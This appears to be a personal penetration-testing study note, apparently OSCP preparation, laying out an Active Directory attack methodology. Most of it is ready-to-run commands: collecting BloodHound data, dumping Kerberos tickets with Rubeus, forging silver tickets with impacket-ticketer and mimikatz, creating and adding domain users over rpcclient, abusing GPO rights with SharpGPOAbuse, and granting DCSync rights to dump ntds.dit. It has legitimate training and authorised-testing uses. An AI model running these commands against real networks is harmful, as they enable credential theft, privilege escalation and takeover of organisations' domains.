This is a mess tbh but still is useful so its STAYING.

Can begin performing these whenever you have a domain joined computer
```
Remember when attempting to authenticate to devices to specify the DOMAIN\User if using a domain account

example: if you just use Administrator, the computer will thing you are attempting to login as LOCAL Administration and not DOMAIN\Administrator
```

## User Enum
Before we can attack AD, we often require users/credentials

Identifying users can be done with kerbrute ([[88 Kerberos]]), and other methods, such as RID Cycling ([[445 SMB]])

## AD Enum
Need to enumerate AD first
Powerview
Sharphound > bloodhound 
etc
Cant auth but have creds?
	nxc ldap ([[Netexec]]) / bloodhound-python ([[Bloodhound (legacy)|Bloodhound (legacy)]])
```bash
## Collect Bloodhound data
nxc ldap '<dc_hostname.domain>(or IP address)' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>

# proxychains
proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
```

```
Consider rerunning as you collect new users and creds...
```

Run prebuilt queries (See [[Bloodhound (legacy)]])
Enum computers
	`MATCH (m:Computer) RETURN m
		save to computers.txt file
		`nslookup <FQDN>
			with ligolo...
Enum users
	`MATCH (m:User) Return m
		save to users.txt file
Qucik Win -- Enumerate for GenericAll/GenericWrite privs
	`MATCH (u:User)-[r:GenericAll|GenericWrite]->(t) RETURN u, r, t
		then check First Degree Object Control
look for asreprostable or kerberostable accounts
Look for shortest path to DA from Owned users!!!!!!!!!!!!!!!!!


#### Check User Descriptions
```bash
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password>' -M get-desc-users
```


#### Checking Privileged Access
```PowerShell
# Enumerate RDP group
Get-NetLocalGroupMember -ComputerName <hostname> -GroupName "Remote Desktop Users"

# Enumerate Remote Management Users Group
Get-NetLocalGroupMember -ComputerName <hostname> -GroupName "Remote Management Users"
```

## AD Attacks
Ensure you have the correct DOMAIN before proceeding...

#### AS-REP Roasting

See [[AS-REP Roasting]]

#### Kerberoasting

See [[Methodology/Active Directory/Kerberoasting|Kerberoasting]]

#### Extracting Tickets

Ticket Extraction
```powershell
# Enumerate logon sessions and associated tickets
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Extracting tickets
C:\path\Rubeus.exe dump /nowrap  # extract ALL tickets

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<luid> /service:<svc (krbtgt, ldap, etc)> /nowrap # extract specific tickets
```

#### ADCS
See [[AD CS Attacks]]

#### ACL Attacks -- DCSync in here
See [[ACL Abuse]]

Group Priv Abuse (passwd change) / GenericAll -> Moved to ACL Abuse
GenericWrite - > Moved to ACL Abuse
DCSync (Dumping) -> ACL Abuse

#### Silver Tickets
For more context, see [[Pass the Ticket (PtT)]]
Used for impersonating a LOCAL service (as opposed to golden tickets which are domain-wide)
	when we forge a ticket, we spoof ANY user (even fake accounts) for a particular service
		ie: svc_mssql as Administrator, we will be able to use xp_cmdshell (because of svc_mssql rights)
		we will still have to privesc further most likely by the end of this

Use case: 
	We have a foothold and the NTLM password hash of a service account (or cleartext password) but we cant directly authenticate as them

Benefits:
	No need to authenticate with a silver ticket to the DC
	Less risk of detection

Requirements:
	Domain SID
	Target SPN of compromised service account
	SPN Password Hash
	a user to impersonate (Administrator)


Forging a Silver Ticket
```bash
1. Fetching requirements
# Domain SID
Get-ADDomain

# Target SPN
Get-ADUser -Filter {SamAccountName -eq "<svc_account_name>"} -Properties ServicePrincipalNames

# SPN Password Hash (NTLM)
https://codebeautify.org/ntlm-hash-generator
if you have the cleartext password, just go to an online NTLM hash generator and convert it
if already an NTLM hash, good to go


2. Forging the Silver Ticket
# From Attack Box:
impacket-ticketer -nthash <NTLM_hash> -domain-sid "<sid>" -domain <domain> -spn <SPN(NO CURLY BRACES)> Administrator
	# ticket will save in "Administrator.ccache" or similar
	ls                                        # to see where it was saved
	klist                                     # to verify in cache
	export KRB5CCNAME=$PWD/<ccache_name>      # adding ccache to env
	klist                                     # verify again

or

# On Victim Box:
.\mimikatz.exe "kerberos::golden /sid:<sid> /domain:<domain> /ptt /target:<hostname> /service:<service> /rc4:<ntlm> /user:Administrator"
	klist     # verify


3. Create /etc/krb5user.conf file #(if attempting to interact from our system)
sudo vim /etc/krb5user.conf
[libdefaults]    
        default_realm = <DOMAIN>   
        kdc_timesync = 1    
        ccache_type = 4    
        forwardable = true    
        proxiable = true    
    rdns = false    
    dns_canonicalize_hostname = false    
        fcc-mit-ticketflags = true    
    
[realms]            
        <DOMAIN> = {    
                kdc = <dc_hostname>.<domain>  
        }    
    
[domain_realm]    
        .<domain> = <DOMAIN>


3. Authenticate using -k (kerberos realms)   # see PtT notes
```

why do we need the conf file?
	how i understand it is because the ticket exists on OUR kali system, so we need this conf to interact with Kerberos realms...

Example silver ticket [[Nagoya|Nagoya]]
	with the ticket now cached, we could authenticate to the service using kerberos authentication (usually a -k)
	need chisel as well? might need to specify 127.0.0.1



#### Domain Trust Abuse
Enumeration and attacks can be found here: [[Domain Trusts]]

#### Abusing RPC
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

```bash
queryuser <user>
enumprivs

#Creating domian user
	createdomuser <user>
	setuserinfo2 <user> 24 Password123!

#Add user to domain group
	METHOD 1:
		addmemtogroup "<group>" "<user>"

	METHOD 2:
	#retrieve RIDs
		lookupnames "<group>"        # record RID
		lookupnames "<user>"         # record RID
	#convert RIDs to hex
		printf '%x\n' <RID>
	#add user to group
		`samraddmembertogroup <group_hex> <user_hex>`
	
```


## DACL / GPO Abuse
See [here](obsidian://open?vault=Obsidian%20Vault&file=OSCP%20Prep%2FMethodology%20Notes%2FGPO%20Abuse)

I also have the info here

IF we have DACL rights, we can modify the GPO. The easiest way is via the following:
```bash
# Windows

1. Upload PowerView.ps1 and it

	Import-Module .\PowerView.ps1
	.\PowerView.ps1

2. Get the Default Domain Polify (or whatever you are able to control)

	Get-GPO -Name "Default Domain Policy"

3. View Perms (bloodhound might have already tipped you that you can control it)

	Get-GPPermission -Guid <ID> -TargetType User -TargetName <user>

4. SharoGPOAbuse.exe to modify our perms to admin

	.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"

5. Force update

	gpupdate /force

6. Restart connection to box

	you are now admin


___________________________________________________

# Linux (not preferable...)

pyGPOabuse.py


___________________________________________________
# Another way

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity <user> -Rights DCSync
	# then just use secrets dump to dump ntds.dit and or SAM
```
There are other methods.



## Troubleshooting

#### KRB_AP_ERR_SKEW(Clock skew too great)
See this [article](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

Fix:
```bash
sudo su -
sudo timedatectl set-ntp off
sudo rdate -n [IP of Target]

Rerun your AD command
```